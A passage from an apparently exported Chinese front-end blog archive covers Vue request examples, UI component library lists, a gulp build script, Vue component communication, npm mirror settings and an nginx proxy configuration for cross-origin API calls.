router.currentRoute.fullPath&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(error);</span><br><span class="line">  &#125;);</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> api</span><br></pre></td></tr></table></figure>
<p>在使用api的 <code>.vue</code>  文件内 <code>import</code>  <code>api.js</code> 就可以发起请求了。</p>
<h4 id="1-GET-带参数"><a href="#1-GET-带参数" class="headerlink" title="1. GET 带参数"></a>1. GET 带参数</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.$api(&#123;</span><br><span class="line">    method: <span class="string">'get'</span>,</span><br><span class="line">    url: <span class="string">'/product'</span>,</span><br><span class="line">    params:&#123;</span><br><span class="line">        q:<span class="string">"老虎"</span>,</span><br><span class="line">        page:<span class="keyword">this</span>.page,</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;).then(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(response.data.data.products)</span><br><span class="line">    &#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(error)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>GET的请求 <code>params</code> 最终是  <code>?q=%E8%80%81%E8%99%8E&amp;page=0</code> 的形式。</p>
<h4 id="2-POST-FormData"><a href="#2-POST-FormData" class="headerlink" title="2. POST FormData"></a>2. POST FormData</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> sendData = <span class="keyword">new</span> FormData();</span><br><span class="line">sendData.append(<span class="string">'q'</span>,<span class="string">"老虎"</span>);</span><br><span class="line">sendData.append(<span class="string">'page'</span>,<span class="keyword">this</span>.page);</span><br><span class="line"><span class="keyword">this</span>.$api(&#123;</span><br><span class="line">    method: <span class="string">'post'</span>,</span><br><span class="line">    url: <span class="string">'/product'</span>,</span><br><span class="line">    &#125;).then(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(response.data.data.products)</span><br><span class="line">    &#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(error)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h4 id="3-POST-JSON"><a href="#3-POST-JSON" class="headerlink" title="3. POST JSON"></a>3. POST JSON</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.$api(&#123;</span><br><span class="line">    method: <span class="string">'post'</span>,</span><br><span class="line">    url: <span class="string">'/product'</span>,</span><br><span class="line">    data:&#123;</span><br><span class="line">        q:<span class="string">"老虎"</span>，</span><br><span class="line">        page: <span class="keyword">this</span>.page</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;).then(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(response.data.data.products)</span><br><span class="line">    &#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(error)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
  </entry>
  <entry>
    <title>Vue-UI组件库</title>
    <url>/%E5%89%8D%E7%AB%AF/Vue-UI%E7%BB%84%E4%BB%B6%E5%BA%93/</url>
    <content><![CDATA[<h2 id="Vue资源精选"><a href="#Vue资源精选" class="headerlink" title="Vue资源精选"></a><a href="http://vue.awesometiny.com/" target="_blank" rel="noopener">Vue资源精选</a></h2><h3 id="vuetify-start-16k"><a href="#vuetify-start-16k" class="headerlink" title="vuetify start 16k"></a><a href="https://vuetifyjs.com/zh-Hans/" target="_blank" rel="noopener">vuetify</a> start 16k</h3><p>Material Component Framework for Vue.js 2</p>
<p>适合做Web管理后台，基本上不用写css就能实现不错效果的UI，遵守Material 规范。也可以写移动端的Web App</p>
<p><img src="/images/前端/Material Component预览UI.png" alt="预览.png"></p>
<h3 id="vue-material-start-7k"><a href="#vue-material-start-7k" class="headerlink" title="vue-material start 7k"></a><a href="https://vuematerial.io/" target="_blank" rel="noopener">vue-material</a> start 7k</h3><p><img src="/images/前端/vue-material预览.png" alt="预览.png"></p>
<h3 id="muse-ui-start-7k"><a href="#muse-ui-start-7k" class="headerlink" title="muse-ui start 7k"></a><a href="https://muse-ui.org/#/zh-CN" target="_blank" rel="noopener">muse-ui</a> start 7k</h3><p>这个是国内开发者写的Material Design组件库，和<code>vue-material</code>感觉差不多</p>
<h3 id="element-start-34k"><a href="#element-start-34k" class="headerlink" title="element start 34k"></a><a href="http://element-cn.eleme.io" target="_blank" rel="noopener">element</a> start 34k</h3><p>饿了么：A Vue.js 2.0 UI Toolkit for Web ，适合Web端，需要自己写css布局</p>
<h3 id="mint-ui-start-13k"><a href="#mint-ui-start-13k" class="headerlink" title="mint-ui start 13k"></a><a href="http://mint-ui.github.io/#!/zh-cn" target="_blank" rel="noopener">mint-ui</a> start 13k</h3><p>饿了么：Mobile UI elements for Vue.js ，适合移动端，需要自己写css布局</p>
<h3 id="Vant-Start-8K"><a href="#Vant-Start-8K" class="headerlink" title="Vant Start 8K"></a><a href="https://github.com/youzan/vant" target="_blank" rel="noopener">Vant</a> Start 8K</h3><p>有赞：Lightweight Mobile UI Components built on Vue，适合做移动端商城，效果类似有赞的微店，商城很多常用的组件都有提供。</p>
<h3 id="bootstrap-vue-start-8-9K"><a href="#bootstrap-vue-start-8-9K" class="headerlink" title="bootstrap-vue  start 8.9K"></a><a href="https://github.com/bootstrap-vue/bootstrap-vue" target="_blank" rel="noopener">bootstrap-vue </a> start 8.9K</h3><p>在使用Vue等框架之前，一部分人用 jQuery +Bootstrap来写前端(Bootstrap是基于 jQuery 的)，所以想用vue+Bootstrap，这个库提供不错的支持。</p>
<h3 id="Vuesax-Start-3K"><a href="#Vuesax-Start-3K" class="headerlink" title="Vuesax Start 3K"></a><a href="https://lusaxweb.github.io/vuesax/components" target="_blank" rel="noopener">Vuesax</a> Start 3K</h3><p>有若干常用组件，但有着非常美妙的色彩和反馈效果，充满活力与灵气</p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
  </entry>
  <entry>
    <title>Gulp的简单实用</title>
    <url>/%E5%89%8D%E7%AB%AF/Gulp%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h4 id="1、首页全局安装gulp"><a href="#1、首页全局安装gulp" class="headerlink" title="1、首页全局安装gulp"></a>1、首页全局安装gulp</h4><p>   <code>npm install --global gulp</code></p>
<h4 id="2、其次局部安装gulp"><a href="#2、其次局部安装gulp" class="headerlink" title="2、其次局部安装gulp"></a>2、其次局部安装gulp</h4><p>  <code>npm install gulp --save-dev</code></p>
<h4 id="3、安装依赖"><a href="#3、安装依赖" class="headerlink" title="3、安装依赖"></a>3、安装依赖</h4><p>  <code>npm install --save-dev gulp-minify-css jshint gulp-jshint gulp-uglify gulp-rename gulp-concat gulp-clean gulp-notify</code></p>
<h4 id="4、在项目根目录下创建一个名为-gulpfile-js-的文件"><a href="#4、在项目根目录下创建一个名为-gulpfile-js-的文件" class="headerlink" title="4、在项目根目录下创建一个名为 gulpfile.js 的文件"></a>4、在项目根目录下创建一个名为 gulpfile.js 的文件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var gulp=require(&apos;gulp&apos;),  //gulp基础库</span><br><span class="line">    minifycss=require(&apos;gulp-minify-css&apos;),   //css压缩</span><br><span class="line">    concat=require(&apos;gulp-concat&apos;),   //合并文件</span><br><span class="line">    uglify=require(&apos;gulp-uglify&apos;),   //js压缩</span><br><span class="line">    rename=require(&apos;gulp-rename&apos;),   //文件重命名</span><br><span class="line">    jshint=require(&apos;gulp-jshint&apos;),   //js检查</span><br><span class="line">    notify=require(&apos;gulp-notify&apos;);   //提示</span><br><span class="line"></span><br><span class="line">gulp.task(&apos;default&apos;,function()&#123;</span><br><span class="line">	gulp.start(&apos;minifycss&apos;,&apos;minifyjs&apos;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">//css处理</span><br><span class="line">gulp.task(&apos;minifycss&apos;,function()&#123;</span><br><span class="line">   return gulp.src(&apos;css/*.css&apos;)      //设置css</span><br><span class="line">       .pipe(concat(&apos;order_query.css&apos;))      //合并css文件到&quot;order_query&quot;</span><br><span class="line">       .pipe(gulp.dest(&apos;css/&apos;))           //设置输出路径</span><br><span class="line">       .pipe(rename(&#123;suffix:&apos;.min&apos;&#125;))         //修改文件名</span><br><span class="line">       .pipe(minifycss())                    //压缩文件</span><br><span class="line">       .pipe(gulp.dest(&apos;css/&apos;))            //输出文件目录</span><br><span class="line">       .pipe(notify(&#123;message:&apos;css task ok&apos;&#125;));   //提示成功</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">//JS处理</span><br><span class="line">gulp.task(&apos;minifyjs&apos;,function()&#123;</span><br><span class="line">   return gulp.src([&apos;js/amazeui.js&apos;,&apos;js/app.js&apos;])  //选择合并的JS</span><br><span class="line">       .pipe(concat(&apos;order_query.js&apos;))   //合并js</span><br><span class="line">       .pipe(gulp.dest(&apos;js/&apos;))         //输出</span><br><span class="line">       .pipe(rename(&#123;suffix:&apos;.min&apos;&#125;))     //重命名</span><br><span class="line">       .pipe(uglify())                    //压缩</span><br><span class="line">       .pipe(gulp.dest(&apos;js/&apos;))            //输出 </span><br><span class="line">       .pipe(notify(&#123;message:&quot;js task ok&quot;&#125;));    //提示</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h4 id="5、运行命令"><a href="#5、运行命令" class="headerlink" title="5、运行命令"></a>5、运行命令</h4><p><code>gulp</code></p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
  </entry>
  <entry>
    <title>Vue父子组件通讯</title>
    <url>/%E5%89%8D%E7%AB%AF/Vue%E7%88%B6%E5%AD%90%E7%BB%84%E4%BB%B6%E9%80%9A%E8%AE%AF/</url>
    <content><![CDATA[<h2 id="父组件传-值-给子组件"><a href="#父组件传-值-给子组件" class="headerlink" title="父组件传 值 给子组件"></a>父组件传 值 给子组件</h2><ol>
<li><p>父组件调用子组件的时候 绑定动态属性</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;v-header :title=&quot;title&quot;&gt;&lt;/v-header&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>在子组件里面通过 props接收父组件传过来的数据</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">props:[&apos;title&apos;]</span><br><span class="line">或者</span><br><span class="line">props:&#123;</span><br><span class="line">&apos;title&apos;:String      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>直接在子组件里面使用</p>
</li>
</ol>
<h2 id="父组件传-函数-给子组件"><a href="#父组件传-函数-给子组件" class="headerlink" title="父组件传 函数 给子组件"></a>父组件传 函数 给子组件</h2><ol>
<li><p>父组件调用子组件的时候 绑定函数</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;v-header :say-hello=&quot;parentSayHello&quot;&gt;&lt;/v-header&gt;</span><br></pre></td></tr></table></figure>
<p> 父组件的函数</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">methods:&#123;</span><br><span class="line">    parentSayHello(name)&#123;</span><br><span class="line">        console.log(name + &quot;say hello&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>在子组件里面通过 props接收父组件传过来的数据</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">props:&#123;</span><br><span class="line">    sayHello:&#123;</span><br><span class="line">        type: Function,</span><br><span class="line">        require: false,</span><br><span class="line">    &#125;,    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>直接在子组件里面使用</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;button @click=&quot;sayHello(&apos;jack&apos;)&quot;/&gt;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="父组件主动调用子组件属性、方法"><a href="#父组件主动调用子组件属性、方法" class="headerlink" title="父组件主动调用子组件属性、方法"></a>父组件主动调用子组件属性、方法</h2><ol>
<li><p>调用子组件的时候定义一个ref</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;v-header ref=&quot;header&quot;&gt;&lt;/v-header&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>在父组件里面通过</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">this.$refs.header.属性</span><br><span class="line">this.$refs.header.方法</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="子组件主动调用父组件的属性、方法"><a href="#子组件主动调用父组件的属性、方法" class="headerlink" title="子组件主动调用父组件的属性、方法"></a>子组件主动调用父组件的属性、方法</h2><ol>
<li>直接调用 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">this.$parent.数据</span><br><span class="line">this.$parent.方法</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="非父子组件通讯"><a href="#非父子组件通讯" class="headerlink" title="非父子组件通讯"></a>非父子组件通讯</h2><p>非父子的组件通讯，可以通过Vuex来实现，另外也可定义一个全局的Vue对象，利用这个Vue的通知来通讯。    </p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
  </entry>
  <entry>
    <title>Vue-UI小组件</title>
    <url>/%E5%89%8D%E7%AB%AF/Vue-UI%E5%B0%8F%E7%BB%84%E4%BB%B6/</url>
    <content><![CDATA[<h3 id="vue-content-loader-start-1-5k"><a href="#vue-content-loader-start-1-5k" class="headerlink" title="vue-content-loader start 1.5k"></a><a href="https://github.com/egoist/vue-content-loader" target="_blank" rel="noopener">vue-content-loader</a> start 1.5k</h3><p>基于Vue.js 用于创建占位符加载的 SVG 组件，例如 Facebook 卡片加载</p>
<p><img src="https://user-images.githubusercontent.com/4838076/34308760-ec55df82-e735-11e7-843b-2e311fa7b7d0.gif" alt="预览.png"></p>
<h3 id="vue-content-loader-start-2-3k"><a href="#vue-content-loader-start-2-3k" class="headerlink" title="vue-content-loader start 2.3k"></a><a href="https://github.com/jbaysolutions/vue-grid-layout" target="_blank" rel="noopener">vue-content-loader</a> start 2.3k</h3><p>基于Vue.js 可拖动且可调整大小的网格布局</p>
<h3 id="Vue-Tree-Chart-start-2-3k"><a href="#Vue-Tree-Chart-start-2-3k" class="headerlink" title="Vue-Tree-Chart start 2.3k"></a><a href="https://github.com/tower1229/Vue-Tree-Chart" target="_blank" rel="noopener">Vue-Tree-Chart</a> start 2.3k</h3><p>Vue2的树形图组件</p>
<h3 id="vue-fullpage-js-start-0-9k"><a href="#vue-fullpage-js-start-0-9k" class="headerlink" title="vue-fullpage.js start 0.9k"></a><a href="https://github.com/alvarotrigo/vue-fullpage.js" target="_blank" rel="noopener">vue-fullpage.js</a> start 0.9k</h3><p>对fullPage.js的Vue封装</p>
<h3 id="图表"><a href="#图表" class="headerlink" title="图表"></a>图表</h3><ol>
<li><a href="https://github.com/ElemeFE/v-charts" target="_blank" rel="noopener">v-charts</a> （start 4.3k），饿了么基于百度的ECharts 和 Vue2.0 封装的 v-charts 图表组件。</li>
<li><a href="https://github.com/ecomfe/vue-echarts" target="_blank" rel="noopener">vue-echarts</a> （start 3.3k），百度团队基于 ECharts v4.1.0+ 开发，依赖 Vue.js v2.2.6+。</li>
<li><a href="https://github.com/apertureless/vue-chartjs" target="_blank" rel="noopener">vue-chartjs （start 2.9k）</a> ，开发者基于 <a href="https://www.chartjs.org/" target="_blank" rel="noopener">chartjs</a> （start 43k）和Vue 封装的图表组件。</li>
<li><a href="https://antv.alipay.com/" target="_blank" rel="noopener">AntV</a> (start 7k) , 蚂蚁金服的图表组件，原生js，提供PC端和移动端两个库，没有Vue封装，在Vue上可能会有坑。</li>
</ol>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
  </entry>
  <entry>
    <title>Word另存为Html设置编码</title>
    <url>/%E5%89%8D%E7%AB%AF/Word%E5%8F%A6%E5%AD%98%E4%B8%BAHtml%E8%AE%BE%E7%BD%AE%E7%BC%96%E7%A0%81/</url>
    <content><![CDATA[<p>Word文档另存为Html时，默认编码是 <code>gb2312</code> ，在浏览器打开中文容易乱码，手动改为 <code>UTF-8</code>是可以，但有点麻烦。</p>
<p>其实Word可以支持修改编码，在 <code>另存为</code>窗口的 “工具” - “编码” 就可以选择保存所用的编码，选择 <code>UTF-8</code> 就行。</p>
<p><img src="images/前端/word转html选择编码格式.png" alt></p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>word,html</tag>
      </tags>
  </entry>
  <entry>
    <title>Xenon基于Bootstrap的响应式后台管理模版</title>
    <url>/%E5%89%8D%E7%AB%AF/Xenon%E5%9F%BA%E4%BA%8EBootstrap%E7%9A%84%E5%93%8D%E5%BA%94%E5%BC%8F%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E6%A8%A1%E6%9D%BF/</url>
    <content><![CDATA[<p><a href="https://www.uedsc.com/xenon.html" target="_blank" rel="noopener">https://www.uedsc.com/xenon.html</a></p>
<p>Xenon响应式后台管理模板，全套模板，包含后台登录页面、仪表盘、皮肤选择、布局、UI元素、按钮、标签和手风琴、模态、进度条、导航栏、警报、分页、小工具、邮箱、表格、表单、地图、画廊、图标、日历、图像裁切、404错误页、排行榜等共127个后台模板页面。</p>
<p><img src="http://www.uedsc.com/wp-content/uploads/2015/06/Xenon-Bootstrap-Admin-Theme.png" alt></p>
<p>Xenon HTML模板是一款后台面板 HTML模板。<br><strong>模板特点：</strong>4个仪表盘，28个布局，UI 元素，在线洽谈，时间轴，相册管理，皮肤创建，通告，各种应用元素，提供说明文档等。</p>
<p><img src="http://www.uedsc.com/wp-content/uploads/2015/06/xenon.jpg" alt></p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
  </entry>
  <entry>
    <title>npm淘宝源</title>
    <url>/%E5%89%8D%E7%AB%AF/npm%E6%B7%98%E5%AE%9D%E6%BA%90/</url>
    <content><![CDATA[<h2 id="国内的源"><a href="#国内的源" class="headerlink" title="国内的源"></a>国内的源</h2><ul>
<li>淘宝源（<a href="https://registry.npm.taobao.org）" target="_blank" rel="noopener">https://registry.npm.taobao.org）</a></li>
<li>腾讯源 (<a href="https://mirrors.cloud.tencent.com/npm/" target="_blank" rel="noopener">https://mirrors.cloud.tencent.com/npm/</a>)</li>
</ul>
<h2 id="ROOT账号问题"><a href="#ROOT账号问题" class="headerlink" title="ROOT账号问题"></a>ROOT账号问题</h2><p>可能是由于安全问题，在root账号下操作一些安装经常出问题，加上以下参数：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm i npm@latest -g --unsafe-perm=true --allow-root</span><br></pre></td></tr></table></figure></p>
<h2 id="CNPM"><a href="#CNPM" class="headerlink" title="CNPM"></a>CNPM</h2><p>cnpm注册为使用国内淘宝的源，不影响国外源npm的使用</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> npm install -g cnpm --registry=https://registry.npm.taobao.org</span></span><br></pre></td></tr></table></figure>
<p>用 <code>cnpm install</code> 安装依赖库会有些小问题，详细请看 <a href="../用cnpm安装软件库的一个问题">《用cnpm安装软件库的一个问题》 </a></p>
<h2 id="修改npm的配置"><a href="#修改npm的配置" class="headerlink" title="修改npm的配置"></a>修改npm的配置</h2><p>如果不想用cnpm而引起上述问题，可以按以下配置。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm config set registry https://registry.npm.taobao.org</span><br><span class="line"></span><br><span class="line">//验证配置</span><br><span class="line">$ npm config get registry</span><br><span class="line">https://registry.npm.taobao.org/</span><br></pre></td></tr></table></figure></p>
<h2 id="删除cnpm"><a href="#删除cnpm" class="headerlink" title="删除cnpm"></a>删除cnpm</h2><p>这时候，你可以删除cnpm了<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm uninstall -g cnpm</span><br><span class="line">removed 629 packages in 12.705s</span><br></pre></td></tr></table></figure></p>
<h2 id="还原官方源"><a href="#还原官方源" class="headerlink" title="还原官方源"></a>还原官方源</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm config set registry https://registry.npmjs.org</span><br></pre></td></tr></table></figure>
<h2 id="查看当前源"><a href="#查看当前源" class="headerlink" title="查看当前源"></a>查看当前源</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm config get registry</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>前端</category>
      </categories>
  </entry>
  <entry>
    <title>免费下载App图标Icon</title>
    <url>/%E5%89%8D%E7%AB%AF/%E5%85%8D%E8%B4%B9%E4%B8%8B%E8%BD%BDApp%E5%9B%BE%E6%A0%87Icon/</url>
    <content><![CDATA[<p>可以下载一些常用的icon</p>
<ul>
<li><a href="https://materialdesignicons.com/" target="_blank" rel="noopener">material-icons</a></li>
<li><a href="https://icons8.com" target="_blank" rel="noopener">icons8.com</a></li>
<li><a href="https://icons8.cn/icons" target="_blank" rel="noopener">icons8.cn</a></li>
<li><a href="https://www.iconfinder.com/" target="_blank" rel="noopener">iconfinder</a></li>
<li><a href="https://www.iconfont.cn/" target="_blank" rel="noopener">阿里妈妈</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>前端动画</title>
    <url>/%E5%89%8D%E7%AB%AF/%E5%89%8D%E7%AB%AF%E5%8A%A8%E7%94%BB/</url>
    <content><![CDATA[<h3 id="aos-js"><a href="#aos-js" class="headerlink" title="aos.js"></a>aos.js</h3><p><a href="https://github.com/michalsnik/aos" target="_blank" rel="noopener">github</a> 和 <a href="https://michalsnik.github.io/aos/" target="_blank" rel="noopener">demo</a></p>
<p>aos.js是一款效果超赞的页面滚动元素动画jQuery动画库插件。该动画库可以在页面滚动时提供28种不同的元素动画效果，以及多种easing效果。在页面往回滚动时，元素会恢复到原来的状态。</p>
<h3 id="Flexslider-js"><a href="#Flexslider-js" class="headerlink" title="Flexslider.js"></a>Flexslider.js</h3><p>Flexslider - 响应式的 jQuery 内容滚动插件</p>
<h3 id="Animate-css"><a href="#Animate-css" class="headerlink" title="Animate.css"></a><strong>Animate.css</strong></h3><p>github](<a href="https://github.com/daneden/animate.css" target="_blank" rel="noopener">https://github.com/daneden/animate.css</a>) 和 <a href="https://daneden.github.io/animate.css/" target="_blank" rel="noopener">demo</a></p>
<p><strong>Animate.css</strong>是一个有趣的，跨浏览器的css3动画库</p>
]]></content>
  </entry>
  <entry>
    <title>nginx解决ajax跨域问题笔记</title>
    <url>/%E5%89%8D%E7%AB%AF/nginx%E8%A7%A3%E5%86%B3ajax%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>问题：</p>
<ol>
<li>前后端分离</li>
<li>前端在编写阶段（机器IP:192.168.1.11），后端已经部署好，数据通过REST API提供（机器IP:192.168.1.33:8000/api/）</li>
<li>跨域问题，就算是端口不一样也会出现。</li>
</ol>
<p>解决跨域问题有多种，这里选择nginx代理。</p>
<p>####nginx配置</p>
<ol>
<li>nginx默认监听80端口，由于是编码阶段，我们不改动。</li>
<li><p>新建一个server监听8080，并且将<a href="http://localhost:8080/api全部转发到http://192.168.1.33:8000/api" target="_blank" rel="noopener">http://localhost:8080/api全部转发到http://192.168.1.33:8000/api</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    server &#123;</span><br><span class="line">        listen       8080;</span><br><span class="line">		server_name  localhost:8080;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">            root   F:/html/myHtmlTest;</span><br><span class="line">            index  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line">		location /api &#123;</span><br><span class="line">             proxy_pass http://192.168.1.33:8000/api;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">```	</span><br><span class="line">或者</span><br></pre></td></tr></table></figure>
<p> server {</p>
<pre><code>listen       8080;
server_name  localhost:8080;

location / {
    root   F:/html/myHtmlTest;
    index  index.html index.htm;
}
location /api/ {
     proxy_pass http://192.168.1.33:8000;
}
</code></pre><p> }</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">两种写法效果一样，区别在于</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>location /api {<br>             proxy_pass <a href="http://192.168.1.33:8000/api" target="_blank" rel="noopener">http://192.168.1.33:8000/api</a>;<br>        }</p>
<p>#这样写<code>proxy_pass</code>不会带上<code>location</code>的“/api ”,所以改成这样<br>location /test{<br>             proxy_pass <a href="http://192.168.1.33:8000/api" target="_blank" rel="noopener">http://192.168.1.33:8000/api</a>;<br>        }</p>
<p>#目标访问地址也是不变的</p>
<p>#但是我们访问就应该是 <a href="http://192.168.1.11:8080/test" target="_blank" rel="noopener">http://192.168.1.11:8080/test</a></p>
<p>#转发到 <a href="http://192.168.1.33:8000/api" target="_blank" rel="noopener">http://192.168.1.33:8000/api</a><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">```</span><br><span class="line">location /api/ &#123;</span><br><span class="line">             proxy_pass http://192.168.1.33:8000;</span><br><span class="line">        &#125;</span><br><span class="line">#这种写法的`proxy_pass`会把`location`的“/api/ ”带上</span><br><span class="line">#当访问 http://192.168.1.11:8080/api/ </span><br><span class="line">#就会转发为 http://192.168.1.33:8000/api/</span><br></pre></td></tr></table></figure></p>
<ol start="3">
<li>前端html文件（如test.html）放在location /.root的目录下（如F:/html/myHtmlTest）</li>
<li>通过<a href="http://localhost:8080/test.html" target="_blank" rel="noopener">http://localhost:8080/test.html</a> 访问html文件</li>
<li>ajax访问资源 var url = “<a href="http://localhost:8080/api/v1/hello/&quot;" target="_blank" rel="noopener">http://localhost:8080/api/v1/hello/&quot;</a>;</li>
<li>nginx会将api转发到<a href="http://192.168.1.33:8000/api" target="_blank" rel="noopener">http://192.168.1.33:8000/api</a>;</li>
</ol>
<p>Linux下的配置文件include了其他默认的配置，可以在里面配置server，如果不需要可以注释掉。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">        include /etc/nginx/conf.d/*.conf;</span><br><span class="line">        include /etc/nginx/sites-enabled/*;</span><br><span class="line"></span><br><span class="line">/etc/nginx/sites-enabled/default文件就是设置默认的端口和目录，内容如：</span><br><span class="line"># Default server configuration</span><br><span class="line">#</span><br><span class="line">server &#123;</span><br><span class="line">        listen 80 default_server;</span><br><span class="line">        listen [::]:80 default_server;</span><br><span class="line"></span><br><span class="line">        root /var/www/html;</span><br><span class="line"></span><br><span class="line">        # Add index.php to the list if you are using PHP</span><br><span class="line">        index index.html index.htm index.nginx-debian.html;</span><br><span class="line"></span><br><span class="line">        server_name _;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">                # First attempt to serve request as file, then</span><br><span class="line">                # as directory, then fall back to displaying a 404.</span><br><span class="line">                try_files $uri $uri/ =404;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="nginx配置文件"><a href="#nginx配置文件" class="headerlink" title="nginx配置文件"></a>nginx配置文件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#user  nobody;</span><br><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line">#error_log  logs/error.log;</span><br><span class="line">#error_log  logs/error.log  notice;</span><br><span class="line">#error_log  logs/error.log  info;</span><br><span class="line"></span><br><span class="line">#pid        logs/nginx.pid;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    #log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class="line">    #                  &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class="line">    #                  &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class="line"></span><br><span class="line">    #access_log  logs/access.log  main;</span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line">    #tcp_nopush     on;</span><br><span class="line"></span><br><span class="line">    #keepalive_timeout  0;</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    #gzip  on;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  localhost;</span><br><span class="line"></span><br><span class="line">        #charset koi8-r;</span><br><span class="line"></span><br><span class="line">        #access_log  logs/host.access.log  main;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">             root   html;</span><br><span class="line">             index  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line">		#location /api &#123;</span><br><span class="line">        #     proxy_pass http://192.168.1.150:8000/api;</span><br><span class="line">        #&#125;</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">        #error_page  404              /404.html;</span><br><span class="line"></span><br><span class="line">        # redirect server error pages to the static page /50x.html</span><br><span class="line">        #</span><br><span class="line">        error_page   500 502 503 504  /50x.html;</span><br><span class="line">        location = /50x.html &#123;</span><br><span class="line">            root   html;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        # proxy the PHP scripts to Apache listening on 127.0.0.1:80</span><br><span class="line">        #</span><br><span class="line">        